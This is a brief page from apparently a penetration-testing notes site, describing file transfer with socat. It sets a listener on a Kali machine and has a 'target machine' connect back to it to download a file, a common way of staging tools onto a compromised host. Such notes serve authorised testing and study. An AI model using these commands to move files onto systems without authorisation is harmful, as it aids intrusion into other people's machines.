---
title: Socat File Transfer
layout: default
nav_order: 8
parent: File Transfers

---

# Socat
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Socat File Transfers
1. Set Listener with file on Kali Machine:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$FILENAME
```

2. Connect to Kali machine from target machine to download file:
```bash
socat TCP:$IP:$PORT file:$FILENAME,create
```
